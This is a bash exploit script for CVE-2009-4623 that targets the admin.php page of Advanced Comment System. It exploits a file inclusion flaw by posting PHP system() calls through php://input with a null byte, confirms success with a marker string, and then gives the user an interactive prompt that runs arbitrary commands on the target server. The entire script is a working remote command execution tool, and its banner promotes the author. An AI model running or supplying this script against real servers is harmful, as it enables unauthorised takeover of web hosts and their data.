#!/bin/bash

printf """
<<!>> Found by  :  kurdish hackers team
<<!>> Write by  :  Samuel Monsempes


   /---------------------------------------------------------------------------------\\
   |                             Do you like this exploit ?                          |
   |---------------------------------------------------------------------------------|
   |         Get the latest version  :  https://github.com/MonsempesSamuel           |
   |         Add me on Linkedin      :  https://www.linkedin.com/in/samuel-monsempes |
   |---------------------------------------------------------------------------------|
   |                                 Thank you!                                      |
   \---------------------------------------------------------------------------------/



"""

if [ "$#" -ne 1 ] || [[ $1 == "-h" ]]; then
printf """
Get a non-interactive shell, open another shell for an advanced use !!!
usage: CVE-2009-4623.sh [hostname_and_Path]
example: CVE-2009-4623.sh http://192.168.1.24/advanced_comment_system/admin.php
options:
        -h	this cruft
"""
exit 1
fi

CMD=$"echo toto58946"
if [[ $(curl -s --data "<?system('$(echo $CMD)');?>" $(echo $1)'?ACS_path=php://input%00' | sed ':a;N;$!ba;s/\n/€/g' | grep -o -P '(?<=system - Administration</h1>).*(?=Selecting database failed)' | sed 's/€//g') == *"toto58946"* ]]
then
	echo "Connected !!!"
	read -p "> " CMD
	while [ "$CMD" != "exit" ]
	do
		curl -s --data "<?system('$(echo $CMD)');?>" $(echo $1)'?ACS_path=php://input%00' | sed ':a;N;$!ba;s/\n/€/g' | grep -o -P '(?<=system - Administration</h1>).*(?=Selecting database failed)' | sed 's/€/\n/g'
		read -p "> " CMD
	done
else
	echo "Exploit Fail !!! Verify the path and if the host is reachable"
fi
